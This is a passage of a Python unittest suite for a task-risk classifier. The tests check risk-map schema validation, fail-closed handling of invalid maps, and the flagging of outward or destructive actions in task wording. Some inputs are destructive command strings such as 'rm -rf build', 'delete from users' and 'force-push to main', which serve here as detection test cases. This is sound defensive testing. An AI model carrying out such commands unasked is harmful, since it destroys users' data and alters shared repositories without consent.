        for odd in ("\ud800", "\u0307", "\n", "`", "\0", "\uffff"):
            self.assertIsInstance(classify(odd, [odd]), Classification)


class RiskMapTests(GitFixture):
    def write_map(self, text):
        path = self.main / ".orcexe" / "risk-map.yaml"
        path.parent.mkdir(exist_ok=True)
        path.write_text(text, encoding="utf-8")
        return path

    def test_add_only_map_and_immutable_inputs(self):
        path = self.write_map('version: 1\nrisky_words: [ledger, payout]\nrisky_paths: ["src/money/**"]\n')
        risk_map = load_risk_map(path)
        self.assertEqual(risk_map, RiskMap(("ledger", "payout"), ("src/money/**",)))
        for task in ("ledgerSuffix README.md", "payout README.md", "Add a docstring to src/money/a.py"):
            self.assertEqual(classify(task, TREE, risk_map).lane, "risky")
        self.assertEqual(classify("Add a docstring to src/money/a.py", ["src/money/a.py"]).lane, "fast")
        empty = load_risk_map(self.write_map("version: 1\nrisky_words: []\nrisky_paths: []\n"))
        self.assertEqual(classify("auth README.md", TREE, empty).lane, "risky")
        self.assertEqual(classify("Fix package-lock.json", TREE, empty).lane, "risky")
        for task, files in (("README.md güncelle sudo", TREE),
                            ("Fix the typo in requirements.txt", ["requirements.txt"])):
            self.assertEqual(classify(task, files, empty).lane, "standard")
        self.assertEqual(classify("README.md sudo", TREE, empty).lane, "standard")
        self.assertEqual(classify("Fix the typo in requirements.txt", ["requirements.txt"], empty).lane,
                         "standard")
        words = ["ledger"]
        risk_map = RiskMap(words)
        words.clear()
        self.assertEqual(risk_map.risky_words, ("ledger",))

    def test_invalid_schema_key_names(self):
        cases = [("", "risk_map"), ("[]", "risk_map"), ("version: 2", "version"),
                 ("version: 1\nfast_words: [sudo]", "fast_words"),
                 ("version: 1\nfast_paths: [requirements.txt]", "fast_paths"),
                 ("risky_words: []", "version"), ("version: true", "version"),
                 ("version: 1.0", "version"), ('version: "1"', "version"),
                 ("version: 1\nunknown: []", "unknown"),
                 ("version: 1\nfast_intents: [execute]", "fast_intents"),
                 ("version: 1\ntarget_classes: [shell]", "target_classes"),
                 ("version: 1\nsafe_words: [sudo]", "safe_words"),
                 ("version: 1\nrisky_words: foo", "risky_words"),
                 ("version: 1\nrisky_words: [1]", "risky_words"),
                 ("version: 1\nrisky_words: [null]", "risky_words"),
                 ('version: 1\nrisky_words: [""]', "risky_words"),
                 ('version: 1\nrisky_words: ["*"]', "risky_words"),
                 ("version: 1\nrisky_paths: null", "risky_paths"),
                 ("version: 1\nrisky_paths: [false]", "risky_paths"),
                 ('version: 1\nrisky_paths: [" "]', "risky_paths"),
                 ('version: 1\nrisky_paths: ["\\0"]', "risky_paths")]
        for text, key in cases:
            with self.subTest(text=text), self.assertRaisesRegex(ValueError, key):
                load_risk_map(self.write_map(text))

    def test_repo_end_to_end_and_invalid_map(self):
        (self.main / "README.md").write_text("example", encoding="utf-8")
        (self.main / "src").mkdir()
        (self.main / "src" / "exitcodes.py").write_text("# fixture", encoding="utf-8")
        self.git_run(self.main, "add", ".")
        with mock.patch.dict(os.environ, self.env, clear=True):
            self.assertEqual(classify_repo(str(self.main / "src"), "README'ye kurulum bölümü ekle").lane, "fast")
            self.assertEqual(classify_repo(str(self.main), "`exitcodes`'a docstring ekle").targets, ("src/exitcodes.py",))
            self.write_map("version: 1\nrisky_words: [ledger]\n")
            self.assertEqual(classify_repo(str(self.main), "ledger README.md").lane, "risky")
            self.write_map("version: 99\n")
            result = classify_repo(str(self.main), "Fix README.md")
            # Decision 028 (T68): an unusable map floors at risky (was "standard").
            self.assertEqual(result.lane, "risky")
            self.assertIn("risk_map_invalid", {s.id for s in result.signals})
            # T58 (P1-3): an unusable map never lowers a text-derived lane
            # (this asserted "standard" before T58).
            self.assertEqual(classify_repo(str(self.main), "auth README.md").lane, "risky")
            self.write_map("version: [\n")
            self.assertEqual(classify_repo(str(self.main), "Fix README.md").lane, "risky")
            self.assertEqual(classify_repo(str(self.home), "Help me").mode, "everyday")

    def test_empty_repo_and_observation_failure(self):
        with mock.patch.dict(os.environ, self.env, clear=True):
            result = classify_repo(str(self.main), "Add README.md")
            self.assertEqual((result.mode, result.lane), ("new", "standard"))
        with mock.patch.object(gitutil, "ls_files", side_effect=gitutil.GitError("failed")):
            result = classify_repo(str(self.main), "Fix README.md")
        self.assertEqual(result.lane, "standard")
        self.assertIn("git_unavailable", {s.id for s in result.signals})

    def test_unreadable_and_dangling_map_fail_closed(self):
        (self.main / "README.md").write_text("example", encoding="utf-8")
        self.git_run(self.main, "add", ".")
        with mock.patch.object(classifier, "load_risk_map", side_effect=PermissionError("denied")):
            result = classify_repo(str(self.main), "Fix README.md")
        self.assertEqual(result.lane, "risky")  # decision 028 (T68); was "standard"
        self.assertIn("risk_map_invalid", {s.id for s in result.signals})
        path = self.main / ".orcexe" / "risk-map.yaml"
        path.parent.mkdir()
        path.symlink_to("absent.yaml")
        result = classify_repo(str(self.main), "Fix README.md")
        self.assertEqual(result.lane, "risky")
        self.assertIn("risk_map_invalid", {s.id for s in result.signals})


class IdentifierVerbTests(unittest.TestCase):
    """T47e: an action stem inside an identifier is not that action."""

    def ids(self, task, files=None):
        return {(s.id, s.detail) for s in classify(task, files).signals
                if s.id in ("outward_action", "destructive", "risk_word")}

    def test_real_t47_goal_is_not_an_outward_commit(self):
        result = classify("Count Turkish fix keywords in history fix_commits", None)
        self.assertNotIn("outward_action", {s.id for s in result.signals})
        self.assertNotEqual(result.lane, "risky")

    def test_identifier_forms_do_not_signal_actions(self):
        cases = {
            "snake_case": ["fix_commits", "send_email_count", "rm_cache", "delete_marker"],
            "camelCase": ["sendEmail", "commitCount", "userPush", "deleteRows"],
            "PascalCase": ["PushNotifier", "CommitGraph", "MailerService", "RemoveFilter"],
            "dotted": ["git.commit_count", "mailer.send", "obj.delete", "config.push"],
            "call": ["git.commit_count()", "commit()", "send(message)", "delete()."],
            "path": ["src/push/x.py", "docs/commit/notes.md", "./push", "../deploy/run",
                     "/usr/bin/send", "~/mail/inbox"],
            "file name": ["mailer.py", "commit.txt", "send.js", "delete.rs"],
            "backticks": ["`commit`", "`send`", "`fix_commits`", "`delete`"],
        }
        for form, names in cases.items():
            for name in names:
                for task in ("Count " + name + " values", "Rename " + name + ".", "(" + name + ") düzelt"):
                    with self.subTest(form=form, task=task):
                        found = {s for s in self.ids(task) if s[0] in ("outward_action", "destructive")}
                        self.assertEqual(found, set())

    def test_prose_forms_still_signal_actions(self):
        cases = [
            ("commit the change", ("outward_action", "commit")),
            ("Commit, then push.", ("outward_action", "push")),
            ("send an email", ("outward_action", "send")),
            ("send an email", ("outward_action", "email")),
            ("(send an email)", ("outward_action", "send")),
            ("Değişikliği gönder", ("outward_action", "gönder")),
            ("commit'leri birleştir", ("outward_action", "commit")),
            ("PUSH it", ("outward_action", "push")),
            ("_push_ it", ("outward_action", "push")),
            ("delete the old notes", ("destructive", "delete")),
            ("delete from users", ("outward_action", "delete from")),
            ("docker push image", ("outward_action", "docker push")),
            ("rm -rf build", ("destructive", "rm")),
            ("fix_commits then commit", ("outward_action", "commit")),
            ("mailer.py and send it", ("outward_action", "send")),
            # A backticked command line keeps its plain words.
            ("run `git push origin`", ("outward_action", "push")),
        ]
        for task, expected in cases:
            with self.subTest(task=task):
                self.assertIn(expected, self.ids(task))
                if expected[0] == "outward_action":
                    self.assertEqual(classify(task, None).lane, "risky")

    def test_kebab_and_slash_joined_words_remain_prose(self):
        cases = [
            ("force-push to main", ("outward_action", "push")),
            ("hard-delete old rows", ("destructive", "delete")),
            ("commit/push the changes", ("outward_action", "commit")),
            ("commit/push the changes", ("outward_action", "push")),
            ("re-deploy the service", ("outward_action", "deploy")),
            ("run pre-commit hooks", ("outward_action", "commit")),
            ("send-email now", ("outward_action", "send")),
            ("remove-dupes in notes", ("destructive", "remove")),
            ("push/pull the branch", ("outward_action", "push")),
            ("rename publish-date", ("outward_action", "publish")),
            ("tools/mail/x", ("outward_action", "mail")),
        ]
        for task, expected in cases:
            with self.subTest(task=task):
                self.assertIn(expected, self.ids(task))
                if expected[0] == "outward_action":
                    self.assertEqual(classify(task, None).lane, "risky")

    def test_multiword_stems_do_not_span_an_identifier(self):
        self.assertNotIn(("outward_action", "docker push"), self.ids("docker push_count"))
        self.assertNotIn(("outward_action", "delete from"), self.ids("delete from_cache"))
        self.assertNotIn(("outward_action", "docker push"), self.ids("docker `x` push"))

    def test_risk_stems_inside_identifiers_still_signal(self):
        for task, stem in [("fix api_key_loader", "api_key"), ("fix payment_service", "payment"),
                           ("fix `auth_token`", "auth"), ("update src/billing/x.py", "billing"),
                           ("fix userAuth", "auth"), ("fix UserAuth flow", "auth"),
                           ("rename getPassword()", "password"), ("load APIKey", "api_key"),
                           ("check customerData.py", "customer"), ("fix secret-store", "secret")]:
            with self.subTest(task=task):
                self.assertIn(("risk_word", stem), self.ids(task))
                self.assertEqual(classify(task, None).lane, "risky")

    def test_camel_risk_split_with_repository_files(self):
        result = classify("Fix userAuth in README.md", TREE)
        self.assertIn(Signal("risk_word", "auth"), result.signals)
        self.assertEqual(result.lane, "risky")
